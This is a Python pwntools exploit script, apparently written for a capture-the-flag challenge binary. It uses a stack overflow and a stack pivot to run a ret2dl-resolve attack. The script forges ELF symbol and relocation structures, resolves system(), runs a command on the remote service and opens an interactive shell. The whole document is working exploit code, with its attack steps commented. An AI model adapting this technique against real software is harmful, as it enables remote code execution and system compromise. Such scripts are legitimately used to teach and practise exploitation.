#!/usr/bin/env python2.7
from pwn import *

HOST  = ''
PORT  = 40022
CMD   = './flag_submitter pwnyman'

if len(sys.argv) > 1:
    HOST  = sys.argv[1]

if len(sys.argv) > 2:
    PORT = sys.argv[2]

if len(sys.argv) > 2:
    CMD = sys.argv[3]

elf = ELF('../bin/chall22')

if len(HOST) > 0:
    io = remote(HOST, PORT, level='warn')
else:
    io = elf.process(level='warn')

DATA   = 0x0804a300
PIVOT  = 0x08048395  # leave ; ret
READ   = elf.plt['read']
PLT    = elf.get_section_by_name('.plt')['sh_addr']

STRTAB = elf.dynamic_value_by_tag('DT_STRTAB')
SYMTAB = elf.dynamic_value_by_tag('DT_SYMTAB')
JMPREL = elf.dynamic_value_by_tag('DT_JMPREL')

# step 1: use the small overflow to pivot to .data after reading
#         another payload there
one  = 'x'*0x18
one += p32(DATA-4)      # ebp
one += p32(READ)        # read(FILENO_STDIN, .data, 0x100-0x30)
one += p32(PIVOT)       # leave ; ret
one += p32(0x00)        # FILENO_STDIN
one += p32(DATA)        # buf
one += p32(0x100-0x30)  # len

# step 2: put some strings where we can find them later
two  = p32(0x00)*4      # replaced later
cmd  = len(two)         # offset for command
two += CMD+'\x00'       # command to run
sys  = len(two)         # offset to system string
two += 'system'+'\x00'  # function to resolv

# align
two += 'x'*((SYMTAB - len(two)) % 0x10)

# step 3: construct a Elf32_Sym struct
sym  = len(two)
two += p32(DATA+sys-STRTAB)  # index of the system string
two += 'JUNK'                # st_value
two += 'JUNK'                # st_size
two += p32(0x00)             # st_other

# step 4: construct a Elf32_Rel struct
rel  = len(two)
two += p32(DATA+0x100)                             # .data
two += p32((((sym+DATA-SYMTAB) // 0x10) << 8) | 7) # relocation entry, 7 is R_386_JMP_SLOT

# step 5: call the fake function and trigger the dl resolve
rop  = p32(PLT)  # plt
rop += p32(DATA+rel-JMPREL) # reloc
rop += p32(0x00)  # ret addr after system()
rop += p32(DATA+cmd)

two  = rop + two[len(rop):]
pay  = one + two
pay  = pay.ljust(0x100, 'x')

io.send(pay)

# step 6: collect the shell, or hope and pray
io.interactive()